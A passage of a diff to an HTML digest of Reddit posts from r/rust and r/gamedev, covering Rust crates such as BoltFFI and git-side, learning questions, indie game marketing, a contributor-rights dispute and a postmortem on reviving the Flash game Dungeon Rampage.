href="https://www.reddit.com/r/rust/comments/1r66qbs/how_to_minimise_manual_mapping_code_with_sqlx/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r66qbs/how_to_minimise_manual_mapping_code_with_sqlx/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r772sb/learning_advice_switch_from_imperactive_go_to_rust/" target="_blank">Learning advice: switch from imperactive Go to Rust</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hi,</p> <p>I&#39;m looking for hints from Go developers who migrated to the Rust world. I don&#39;t have any trouble understanding lifetimes, borrowing, RAII, etc. I can write C/C++ code easily, but that is, let&#39;s say, imperative style.</p> <p>I have difficulties switching to Rust idiomatic code (Option, Some, None). When I want to transform a string, my brain works imperatively: find dot, split, trim, iterate, etc. I get very disappointed when eventually, I discover operations like `rsplit_once` which can shorten my few-liner into a single operation. And then there is the magic of map/filter combined with Somes and Nones.</p> <p>What should I do to fully switch to idiomatic Rust? Rustlings? I have concerns that I&#39;m hitting my limitations since I&#39;ve never appreciated functional languages.</p> <p>Cheers!</p> <p>// sorry for typo in title: imperative ;) </p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/6502stuff"> /u/6502stuff </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r772sb/learning_advice_switch_from_imperactive_go_to_rust/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r772sb/learning_advice_switch_from_imperactive_go_to_rust/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r66994/sparkconnect_a_spark_connect_client_for_rust/" target="_blank">spark-connect: A Spark Connect client for Rust</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hi!</p> <p>I’d like to share a crate that I’ve been working on: <code>spark-connect</code>.</p> <p><strong>It is a fully asynchronous Rust client for interacting with a remote Spark Connect server.</strong></p> <p>Similar efforts exist in the community (shoutout to <a href="https://crates.io/crates/spark-connect-rs">spark-connect-rs</a> which provided plenty of inspiration), but I often found existing solutions were bloated or <em>explicitly marked as experimental</em>.</p> <p>So I&#39;m trying to work from the ground up to build something that is actively maintained and can actually be used in production.</p> <p>I&#39;ve tested 0.2.0 amply, and am very satisfied with where it&#39;s at.</p> <p><strong>If you could take a look (and ideally give the repo a star ^^) I&#39;d greatly appreciate it!</strong></p> <p>I already have some things I want to implement for 0.3, but if you have any suggestions, please let me know!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/franciscoabsampaio"> /u/franciscoabsampaio </a> <br/> <span><a href="https://www.franciscoabsampaio.com/blog/2026/spark-connect/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r66994/sparkconnect_a_spark_connect_client_for_rust/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r768bm/boltffi_a_highperformance_rust_bindings_generator/" target="_blank">BoltFFI: a high-performance Rust bindings generator (up to 1,000× vs UniFFI microbenchmarks)</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Repo + benchmarks: <a href="https://github.com/boltffi/boltffi">https://github.com/boltffi/boltffi</a></p> <p>We’ve been working on BoltFFI, a tool to generate bindings and package Rust code for iOS, Android, and the Web.<br/> It is focused on keeping boundary overhead low where primitives are passed as values, structs-of-primitives by pointer, strings and collections use optimized encoding format.</p> <p>The tool handles the artifact generation out of the box, producing an XCFramework for Apple platforms, and native outputs for Android and WASM (supporting multiple bundlers).</p> <p>Swift, Kotlin, and TypeScript (WASM) are supported today. Python is next and other languages are in the backlog.</p> <p>The Benchmarks and code are in the repo (vs UniFFI).<br/> A few highlights:</p> <ul> <li><code>echo_i32</code>: &lt;1 ns vs 1,416 ns → &gt;1000×</li> <li><code>counter_increment (1k calls)</code>: 1,083 ns vs 1,388,895 ns → 1,282×</li> <li><code>generate_locations (10k structs)</code>: 62,542 ns vs 12,817,000 ns → 205×</li> </ul> <p>Repo &amp; Benchmarks: <a href="https://github.com/boltffi/boltffi">https://github.com/boltffi/boltffi</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/alihilal94"> /u/alihilal94 </a> <br/> <span><a href="https://i.redd.it/w5cmgsui52kg1.gif">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r768bm/boltffi_a_highperformance_rust_bindings_generator/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r642lw/rustanalyzer_changelog_315/" target="_blank">rust-analyzer changelog #315</a>
-            <div class="item-content">&#32; submitted by &#32; <a href="https://www.reddit.com/user/WellMakeItSomehow"> /u/WellMakeItSomehow </a> <br/> <span><a href="https://rust-analyzer.github.io/thisweek/2026/02/16/changelog-315.html">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r642lw/rustanalyzer_changelog_315/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r7623m/gitside_a_git_subcommand_that_versions_files_and/" target="_blank">git-side: A Git subcommand that versions files and directories that should not live in the main repository, using a per-project bare repository invisible to Git.</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I built an open-source tool (MIT License) to solve a problem I kept running into while working on some client&#39;s projects.</p> <p>I wanted to version the .claude/ folder and <a href="http://CLAUDE.md">CLAUDE.md</a> files, but I don&#39;t want them in the main repo history.</p> <p>Some teams prefer to keep these out of the shared repo. Some projects have strict policies about what gets committed. And sometimes you just want to keep your AI context private while still having version control.</p> <p>I also create a lot of .md files to track my backlog, progress, notes, experiments, and I don&#39;t want to commit them to the main repo, but I still need to track them somewhere.</p> <p>git-side creates a separate, invisible Git repo for each project that tracks files alongside your main repo but is completely separate from it.</p> <p>Also, git-side completely ignores the global and the local .gitignore files (by design).</p> <p>The project gets inspiration from vcsh.</p> <p>Tracking your Claude artifacts is simple as in:</p> <pre><code>git side add .claude git side add CLAUDE.md </code></pre> <p>committing to the side repo:</p> <pre><code>git side commit -m &quot;Updated project context&quot; </code></pre> <p>or auto-sync after every main repo commit</p> <pre><code>git side hook install </code></pre> <p>The side repo lives outside your project (no dotfiles, no config changes) and uses the initial commit SHA as a stable project identifier; it works across clones, no remote needed.</p> <p>Also supports custom storage paths, remotes, and simple push/pull (force-based, no merge conflicts).</p> <p>GitHub: <a href="https://github.com/Solexma/git-side">https://github.com/Solexma/git-side</a></p> <p>Still early days. I built this for myself first, but I&#39;m curious what you think. Feedback is more than welcome</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/MiPnamic"> /u/MiPnamic </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r7623m/gitside_a_git_subcommand_that_versions_files_and/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r7623m/gitside_a_git_subcommand_that_versions_files_and/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r63svr/whats_everyone_working_on_this_week_72026/" target="_blank">What's everyone working on this week (7/2026)</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>New week, new Rust! What are you folks up to? Answer here or over at <a href="https://users.rust-lang.org/t/whats-everyone-working-on-this-week-7-2026/138317?u=llogiq">rust-users</a>!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/llogiq"> /u/llogiq </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r63svr/whats_everyone_working_on_this_week_72026/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r63svr/whats_everyone_working_on_this_week_72026/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r74pvc/iced_is_so_easy_to_use/" target="_blank">iced is so easy to use!</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I am remaking cause my post was removed for having an image and not being media. The image was simply as a visual aid and not the main part.</p> <p>Anyway I have been looking into GUI frameworks, and I found iced to be the easiest. As someone with extremely limited rust knowledge, I was able to take the default counter program and add: a decrement button (this was added anyway, but it wasn&#39;t hard to add so I did it myself), a set to specific value input and button, and a slider to change the amount to increment and decrement by. This was with only limited docs usage, making it, to me, seems like an ideal simple UI library for basic tools and apps.</p> <p>I&#39;m wondering, what are your experiences with ices, or do you use a different library?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/SmoothTurtle872"> /u/SmoothTurtle872 </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r74pvc/iced_is_so_easy_to_use/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r74pvc/iced_is_so_easy_to_use/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r63rzp/hey_rustaceans_got_a_question_ask_here_72026/" target="_blank">Hey Rustaceans! Got a question? Ask here (7/2026)!</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Mystified about strings? Borrow checker has you in a headlock? Seek help here! There are no stupid questions, only docs that haven&#39;t been written yet. Please note that if you include code examples to e.g. show a compiler error or surprising result, linking a <a href="https://play.rust-lang.org/">playground</a> with the code will improve your chances of getting help quickly.</p> <p>If you have a <a href="http://stackoverflow.com/">StackOverflow</a> account, consider asking it there instead! StackOverflow shows up much higher in search results, so ahaving your question there also helps future Rust users (be sure to give it <a href="http://stackoverflow.com/questions/tagged/rust">the &quot;Rust&quot; tag</a> for maximum visibility). Note that this site is very interested in question quality. I&#39;ve been asked to read a RFC I authored once. If you want your code reviewed or review other&#39;s code, there&#39;s a <a href="https://codereview.stackexchange.com/questions/tagged/rust">codereview stackexchange</a>, too. If you need to test your code, maybe <a href="https://play.rust-lang.org">the Rust playground</a> is for you.</p> <p>Here are some other venues where help may be found:</p> <p><a href="https://www.reddit.com/r/learnrust">/r/learnrust</a> is a subreddit to share your questions and epiphanies learning Rust programming.</p> <p>The official Rust user forums: <a href="https://users.rust-lang.org/">https://users.rust-lang.org/</a>.</p> <p>The official Rust Programming Language Discord: <a href="https://discord.gg/rust-lang">https://discord.gg/rust-lang</a></p> <p>The unofficial Rust community Discord: <a href="https://bit.ly/rust-community">https://bit.ly/rust-community</a></p> <p>Also check out <a href="https://reddit.com/r/rust/comments//1qzwpav/hey_rustaceans_got_an_easy_question_ask_here/">last week&#39;s thread</a> with many good questions and answers. And if you believe your question to be either very complex or worthy of larger dissemination, feel free to create a text post.</p> <p>Also if you want to be mentored by experienced Rustaceans, tell us the area of expertise that you seek. Finally, if you are looking for Rust jobs, the most recent thread is <a href="https://www.reddit.com/r/rust/comments/1qkkqi9/official_rrust_whos_hiring_thread_for_jobseekers/">here</a>.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/llogiq"> /u/llogiq </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r63rzp/hey_rustaceans_got_a_question_ask_here_72026/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r63rzp/hey_rustaceans_got_a_question_ask_here_72026/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r72tki/do_rust_has_anything_like_the_charm_from_go/" target="_blank">Do Rust has anything like the Charm from Go?</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I&#39;m building a side project and I decided to make it in Rust. My main issue right now is the TUI. I really need some fancy features like the ones from <a href="https://github.com/charmbracelet">https://github.com/charmbracelet</a> Do you know if Rust has anything like that?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/fenugurod"> /u/fenugurod </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r72tki/do_rust_has_anything_like_the_charm_from_go/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r72tki/do_rust_has_anything_like_the_charm_from_go/">[comments]</a></span></div>
+          </li>
+  
+        </ul>
+  
+        <h3 class="subreddit">r/gamedev</h3>
+        <ul class="item-list">
+  
+          <li>
+            <a href="https://www.reddit.com/r/gamedev/comments/1r7nvpi/whats_a_good_social_to_market_your_game_with_no/" target="_blank">what’s a good social to market your game with no community or background?</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>i’ve tried both youtube shorts and tiktok, but they’re both designed against the favor of smaller creators. everything is capped at 2k views best case scenario and not everyone has the time to learn how to optimize videos (game dev by itself is arguably hard). i figured that quite a few people would have this question, so what’s a social i can start posting to make myself a reasonable community/fuzz for my game? (remember that subscriber counts give you initially more chances to break the algorithm). i think that both reddit and discord are pretty against self promo. thanks in advance!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/One-Reference3116"> /u/One-Reference3116 </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r7nvpi/whats_a_good_social_to_market_your_game_with_no/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r7nvpi/whats_a_good_social_to_market_your_game_with_no/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r601u4/shipping_my_rust_cli_to_windows_lessons_learned/" target="_blank">Shipping My Rust CLI to Windows: Lessons Learned (feat. Windows 98 and APE Bonus)</a>
-            <div class="item-content">&#32; submitted by &#32; <a href="https://www.reddit.com/user/IvanIsCoding"> /u/IvanIsCoding </a> <br/> <span><a href="https://ivaniscoding.github.io/posts/rustpackaging4/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r601u4/shipping_my_rust_cli_to_windows_lessons_learned/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/gamedev/comments/1r7lyge/how_does_dont_starve_handle_mob_movement_without/" target="_blank">How does Don't Starve handle mob movement without collisions?</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I&#39;ve been working on NPCs in Unity in my game. And I noticed that in Don&#39;t Starve, mobs move so smoothly: idle mobs don&#39;t collide with trees, structures, or other mobs when walking randomly. And when a group (like Beefalos) chases the player, the ones in the back don&#39;t bump into the ones in front.</p> <p>Any idea on the trick they&#39;re using? Is it just simple steering behaviour? Thank you in advance.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Awkward-Refuse653"> /u/Awkward-Refuse653 </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r7lyge/how_does_dont_starve_handle_mob_movement_without/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r7lyge/how_does_dont_starve_handle_mob_movement_without/">[comments]</a></span></div>
+          </li>
+  
+          <li>
+            <a href="https://www.reddit.com/r/gamedev/comments/1r7lqcx/game_art_creating_moss_and_foliage_question/" target="_blank">Game Art: Creating Moss and foliage (Question)</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hello! </p> <p>I apologize if this is the wrong place to ask- but I am trying to make game ready foliage and I dont have much experience at all. How would you approach making moss (both for on trees and ground coverage)? Does anyone have any good resources I could use to figure out what the process is? I am having a hard time finding good information. </p> <p>Specifics: looking for resources or information on creating game ready foliage- specifically moss for ground and tree coverage. </p> <p>Thank you! </p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Over_Thing_3071"> /u/Over_Thing_3071 </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r7lqcx/game_art_creating_moss_and_foliage_question/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r7lqcx/game_art_creating_moss_and_foliage_question/">[comments]</a></span></div>
+          </li>
+  
+          <li>
+            <a href="https://www.reddit.com/r/gamedev/comments/1r7lfcf/how_careful_should_i_be_with_originality/" target="_blank">How careful should I be with originality?</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Since being a little kid, i&#39;ve always dreamt of making a 2D metroidvania, I did not know what a metroidvania was until very recently and it clicked, I knew instantly that this is the type of game i&#39;d really enjoy making... there&#39;s just one issue.</p> <p>Every single metroidvania gets accused of being a copy of Hollow Knight. I&#39;ve tried over and over again to find creative solutions, but it&#39;s extremely difficult to add upgrades, mobility and supernatural story without it being similar to Hollow Knight, it&#39;s an insanely successful game, very much deserved, but it is very frustrating that every single game that tries to exist within the same genre gets mass hated on. </p> <p>I&#39;m losing hope in my own game, I simply can&#39;t picture myself being able to publish this game since it also has a dash and wall jump. I hate how limited the 2D platformer aspect is, cause the second you add something remotely similar to Hollow Knight, it&#39;s a copy and &quot;trying to be next big thing&quot;. Heck, if your game is even 2D then it&#39;s just Hollow Knight!</p> <p>Suggestions? How strict should I be with this? Is this a real issue or are people online just annoying about this type of stuff in general? And how does it affect actual reputation of the game? Is it just viewed as slop if it has a dash?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Flipzz_Jepser"> /u/Flipzz_Jepser </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r7lfcf/how_careful_should_i_be_with_originality/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r7lfcf/how_careful_should_i_be_with_originality/">[comments]</a></span></div>
+          </li>
+  
+          <li>
+            <a href="https://www.reddit.com/r/gamedev/comments/1r7l3zq/my_friend_wants_me_to_sign_away_all_rights_to_2/" target="_blank">My friend wants me to sign away all rights to 2 years of unpaid work on his game</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I need some outside perspective because I&#39;m really torn and feel terrible right now.</p> <p>I&#39;ve been friends with this guy for over ten years. About three years ago, he started working on a computer game and asked me to help with the programming/logic side. His expertise is design, mine is coding. At the time, I didn&#39;t think about signing contracts or anything formal. I just wanted to help a friend make a cool game.</p> <p>So, for the last two years, I&#39;ve been working on this project in my free time. I built a lot of core systems: weapon mechanics, survival elements based on temperature, the general game framework (saves, quests, dialogue system), and simple AI for enemies. Besides coding, I was also actively involved in the creative side - discussing story ideas, quests, and locations with him. After two years of continuous work, I honestly felt like this was our game.</p> <p>Yesterday, he sent me a message asking me to &quot;sign a simple document, just a formality, to protect the project just in case.&quot; He said it was a standard thing.</p> <p>My gut instinct immediately felt off. When I read the document, my heart sank. It basically says the following:</p> <p>-I am a volunteer. Not a co-owner, not a partner, not even a paid contractor.</p> <p>-I have no right to any compensation whatsoever, even if the game makes money.</p> <p>-I have to assign him full, exclusive, perpetual rights to every line of code and every idea I&#39;ve contributed. I can never take it back.</p> <p>-He can terminate my involvement at any time for any reason, and all my work stays with him.</p> <p>-As a final touch, if I get any credit at all, it will be &quot;in a form and place to be determined by the Project Owner&quot; (him).</p> <p>He’s a good friend (or so I thought), and he said we can &quot;adjust the document if I don&#39;t like something.&quot; He even mentioned at the end of our chat that we could potentially add a 50/50 profit-share clause after the game covers its costs. He then added: &quot;If you have no ill will, you&#39;ll have no problems signing it.&quot;</p> <p>Right now, I&#39;m sitting here with three options: agree and work pretending like nothing happened, try to negotiate for that 50/50 profit-share and better credit terms or refuse to sign.</p> <p>I feel used, and I&#39;m not sure if our friendship can survive this. Has anyone been through something similar? What would you do?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Aldekotan"> /u/Aldekotan </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r7l3zq/my_friend_wants_me_to_sign_away_all_rights_to_2/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r7l3zq/my_friend_wants_me_to_sign_away_all_rights_to_2/">[comments]</a></span></div>
+          </li>
+  
+          <li>
+            <a href="https://www.reddit.com/r/gamedev/comments/1r7jb2g/where_do_you_start_talking_about_your_game_once/" target="_blank">Where do you start talking about your game once you have a solid demo?</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I know these posts are a dime a dozen, but I&#39;m wondering where people begin talking about their games once they have a solid demo on steam.</p> <p>For context: my last game was on the playdate and it felt a lot easier to talk about, but I think that&#39;s mostly cause the playdate community is very concentrated &amp; supportive. For PC games it seems like communities are more varied and seem to stay in subs around single games.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/bumbleborndev"> /u/bumbleborndev </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r7jb2g/where_do_you_start_talking_about_your_game_once/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r7jb2g/where_do_you_start_talking_about_your_game_once/">[comments]</a></span></div>
+          </li>
+  
+          <li>
+            <a href="https://www.reddit.com/r/gamedev/comments/1r7gprc/how_do_you_explain_change_requests_to_a_sound/" target="_blank">How do you explain change requests to a sound designer?</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I started working with a sound designer who is great. But I&#39;ve run into an issue where I will give him a description but if he gives me a sound effect that isn&#39;t quite right I don&#39;t know how to describe what he should change. With visual art it&#39;s easy to say, the character should be taller or have different color hair or whatever. But I can&#39;t articulate a sound like that with words. Has anyone else had this problem?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/dr_rozy94"> /u/dr_rozy94 </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r7gprc/how_do_you_explain_change_requests_to_a_sound/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r7gprc/how_do_you_explain_change_requests_to_a_sound/">[comments]</a></span></div>
+          </li>
+  
+          <li>
+            <a href="https://www.reddit.com/r/gamedev/comments/1r7dvci/i_followed_your_marketing_advice_and_improved_my/" target="_blank">I followed your marketing advice and improved my itch page</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I&#39;m still very much a student of marketing and curb appeal. Please tell me how it looks at a glance - I&#39;ve added what I hope are some descriptive gifs!</p> <p><a href="https://circuitroot.itch.io/highreachgrit">https://circuitroot.itch.io/highreachgrit</a></p> <p>The game is still incomplete, so this isn&#39;t a final marketing push. But I&#39;m at a point where I would very much benefit from having playtesters for feedback and I would like to grow a small community if possible. I appreciate any advice towards this goal!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/JobCentuouro"> /u/JobCentuouro </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r7dvci/i_followed_your_marketing_advice_and_improved_my/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r7dvci/i_followed_your_marketing_advice_and_improved_my/">[comments]</a></span></div>
+          </li>
+  
+          <li>
+            <a href="https://www.reddit.com/r/gamedev/comments/1r7abe7/godot_veteran_says_ai_slop_pull_requests_have/" target="_blank">Godot veteran says 'AI slop' pull requests have become overwhelming</a>
+            <div class="item-content"><table> <tr><td> <a href="https://www.reddit.com/r/gamedev/comments/1r7abe7/godot_veteran_says_ai_slop_pull_requests_have/">  </a> </td><td> &#32; submitted by &#32; <a href="https://www.reddit.com/user/b1ak3"> /u/b1ak3 </a> <br/> <span><a href="https://www.gamedeveloper.com/programming/godot-co-founder-says-ai-slop-pull-requests-have-become-overwhelming">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r7abe7/godot_veteran_says_ai_slop_pull_requests_have/">[comments]</a></span> </td></tr></table></div>
+          </li>
+  
+          <li>
+            <a href="https://www.reddit.com/r/gamedev/comments/1r77hmp/200k_painful_wishlists_what_reviving_a_flash_game/" target="_blank">200k painful wishlists. What reviving a flash game taught me about game marketing & development</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hello,</p> <p>I’m Mako, the ‘revivalist’ of <strong><em>Dungeon Rampage</em></strong>. Dungeon Rampage was a co-op ARPG from the Flash Facebook era (2012–2017). I used to play it all the time with my brother. When it shut down, I was so bummed that I basically swore I’d bring it back one day.</p> <p>That promise has been both my worst nightmare and my biggest blessing.</p> <p>I’ve spent the last 5 years, since I was fourteen, trying to make that happen.</p> <h1>TL;DR – The current results</h1> <ul> <li>Almost <strong>200k lifetime wishlists</strong></li> <li>Over <strong>50k units sold (in 1st month)</strong></li> <li>~<strong>60k Discord members</strong></li> </ul> <p>But reactivating a player base that hadn’t touched the game in 8+ years has been nothing but a challenge.</p> <h1>How it started (and almost failed)</h1> <p>Initially, this was a fan remake project that I didn&#39;t even start! I joined the team sometime later, but helped a lot with primarily the community management, production &amp; design. We were fans who wanted our beloved game to come back. Unfortunately, as we all know, game development is not easy. and we had our ups &amp; downs.</p> <p>For years, we worked on it as volunteers. We made progress, but there was an ocean of problems, some we didn’t even know existed. Like most teams, we were incredibly ambitious.</p> <p>But we had:</p> <ul> <li>No license</li> <li>No source code</li> <li>No archived assets</li> </ul> <p>Everything moved painfully slowly.</p> <p>After almost four years, we had… a demo of the first level. People were growing impatient. We had overpromised. And we failed :( </p> <h1>Getting back the license</h1> <p>In 2024, after messaging 1,000+ people (with a sub-0% response rate), I somehow got in touch with the original CEO. By a stroke of luck, he helped us secure the license.</p> <p>At that point, we already had a large community built through nostalgia-driven social content and sharing the revival journey. But we didn’t really have a game, just some art assets and a prototype.</p> <p>We tried:</p> <ul> <li>Starting our own studio</li> <li>Getting a publisher</li> <li>Crowdfunding</li> </ul> <p>Nothing worked. Eventually, I partnered with Gamebreaking Studios for co-development. The fan remake was officially abandoned.</p> <p>That was hard. The original project had existed for nearly 4 years. But it was the right call.</p> <h1>The source code resurrection</h1> <p>After more outreach, we were able to get a source code archive of the last build of the game - from none other than the last engineer’s laptop which had been handed down to his daughter.</p> <p>With that, we went straight to work trying to get the Flash Game to compile and have the servers to work properly, and after weeks of trial and error, we got it working! </p> <p>With the game compiling, and the servers running, we wanted to showcase that we can be <strong>trusted</strong>.</p> <p>Having a demo with 1 level and no changes for 4 years is, in hindsight, very suspicious. So we put all of our effort into making a prototype, cutting almost all the game’s content and keeping its core identity. Immediate questions:</p> <ul> <li>Will people still like the game?</li> <li>Are there any crazy bugs or exploits we have to look into?</li> <li>How do we ensure the most hardcore fans (those who supported the fan remake), finally see the game alive again, and quickly?</li> </ul> <p>So we spent the next 2 months just on a prototype. We saw immediate success with people loving the game again. Even though it had roughly 2 hours of content, people spent DAYS maxing out characters and getting a huge boost of nostalgia and we started getting a bunch of positive sentiment, and we saw the <strong>players finally trusting us</strong>.</p> <h1>Winning back trust</h1> <p>After “securing” a rough prototype of the game, we got deep into Community. We had to ask ourselves:</p> <p>How do you regain trust from players who expect the stars, when you might only be able to deliver the moon?</p> <p>The answer: <strong>transparency and humanity.</strong></p> <p>We’re a small team. We couldn’t pretend to be AAA. We couldn’t overpromise again.</p> <p>Personally, I always loved when devs responded to my messages. So we made that core to our approach.</p> <p>Meanwhile, our dream was getting back the original Facebook page - 2.1 million followers. And after more cold outreach, reading documentation, seeing stories about people getting back pages, we were again stuck. So, we fell back to what has worked best, WE ASKED FOR HELP! We reached out and were able to get back the original domain for the game, and also a developer had access to the page and was able to add us to it.</p> <p>Eventually:</p> <ul> <li>We recovered the original domain</li> <li>A former dev added us back to the Facebook page</li> </ul> <p>Huge win.</p> <h1>The Kickstarter chaos</h1> <p>With:</p> <ul> <li>37k people in Discord</li> <li>2.1M Facebook followers</li> <li>A semi playable build</li> </ul> <p>We asked the scary question: “What if we launch a Kickstarter?”</p> <p>We weren’t even sure people still used Facebook like they did back then. At the same time, we were preparing:</p> <ul> <li>Another playtest for supporters of the original fan remake</li> <li>The Kickstarter campaign</li> <li>Steam Next Fest</li> </ul> <p>It was honestly a mess.</p> <p>We tried launching Kickstarter ourselves. No experience. Bad graphics. Weak strategy. I was also preparing for university entrance exams. Everyone around me thought this was going to fail.</p> <p>Then we got help! A proper agency stepped in and essentially took over the campaign strategy and visuals.</p> <p>Biggest lesson at that point:</p> <p><strong>GET HELP.</strong></p> <p>Help came from:</p> <ul> <li>Discord volunteers</li> <li>The co-dev studio</li> <li>The Kickstarter agency</li> <li>Other indie devs giving advice</li> </ul> <p>The indie side of games is by FAR the most easy to approach for help. And I had multiple wake up calls from people telling me that we CANNOT do a Kickstarter alone. (They were right).</p> <h1>Launch day (again… chaos)</h1> <p>After a lot of work with the agency, and internally, we were set with the Kickstarter and a Steam Next Fest Demo. With launch day arriving, we thought we were set. We were wrong again! The moment Kickstarter was live, we had thousands of questions on Discord, Kickstarter itself, and emails.</p> <p>At the same time, we had Steam Next Fest. It was tough to balance. But, we pushed through.</p> <p>We got funding and a ‘beating heart’ that the community CRAVES this game. We were able to get enough money to get more people on the team to launch this, and some extra for QOL stuff we wanted to do.</p> <p>Thus far, things looked positive…</p> <p>…Until you realize that you need to balance the receipts from the fan remake with the limited info we had from that, and the info from Kickstarter, and do updates so that our community knows we aren’t scamming them, and at the same time I WAS ABOUT TO WRITE MY UNIVERSITY ADMISSIONS EXAMS. (Thanks Greek Panhellenics System)</p> <h1>MORE CHAOS</h1> <p>Panic strikes again.</p> <p>We had to reconcile:</p> <ul> <li>Fan remake supporters</li> <li>Kickstarter backers</li> <li>Playtest rewards</li> <li>Customer support</li> <li>Overlapping entitlements</li> </ul> <p>And I was about to sit for my university entrance exams.</p> <p>We had dozens of spreadsheets. No version control. No clarity on who changed what. Every small change required manual communication.</p> <p>It was chaos.</p> <p>That’s when we found better tooling (FirstLook). We imported everything. Suddenly:</p> <ul> <li>No more manual emails</li> <li>No more spreadsheet nightmares</li> <li>Clear tracking</li> <li>Cleaner upgrades and access control</li> <li>Clear sentiment and feedback displayed from our diverse community</li> </ul> <p>Lesson: <strong>Invest in tools, please, It doesn’t only save time, but it saves your sanity.</strong></p> <h1>Early Access launch (and more mistakes)</h1> <p>With Kickstarter being in a managed state and me getting accepted into university, we were able to get back into a development flow!</p> <p>I decided to take a year or two off university, and just spend all my time on the game. We launched playtests for our Kickstarter backers, onboarded more developers into the project, and started FINALLY turning things for the better.</p> <p>We used our playtest group to get as much sentiment info as possible on how the game is, with FirstLook helping for knowing which players have which problems.</p> <p>And after months of work which could be condensed to ‘putting out fires’, we were able to 